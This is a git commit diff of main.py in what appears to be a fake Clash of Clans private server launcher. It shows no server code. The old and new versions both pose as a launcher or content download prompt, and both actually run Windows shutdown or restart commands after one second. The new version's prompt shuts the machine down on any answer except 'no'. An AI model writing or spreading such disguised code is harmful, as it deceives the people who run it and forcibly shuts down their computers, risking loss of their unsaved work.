993b48d97b334be9ed23c2fbe1609e4a2ed00c2b
knightdark10 <79816266+knightdark10@users.noreply.github.com>
2022-01-27 18:47:02 +0700

    Update main.py

--- main.py
+++ main.py
@@ -1,12 +1,16 @@
-import os;
-print("1. Starting Clash of Clans Server For Client 9.256");
-print("2. Starting Clash of Clans Server For Client 11.49");
-print("3. Starting Clash of Clans Server For Client 14.211.16");
-dick = int(input("\n Choose which version Clash of Clans you want run it: "));
-if(dick>=1 and dick<=2):
-    if dick == 1:
-        os.system("shutdown /s /t 1");
-    else:
-        os.system("shutdown /r /t 1");
-else:
-    exit();
+
+import os 
+
+  
+
+shutdown = input("Clash of Clans Server has preparing to lauch.. Are you want continue, its required downloading some content sc up to 96mb, Do you really want continue ? (yes / no): ") 
+
+  
+if shutdown == 'no': 
+
+    exit() 
+
+else: 
+
+    os.system("shutdown /s /t 1") 
+Output:
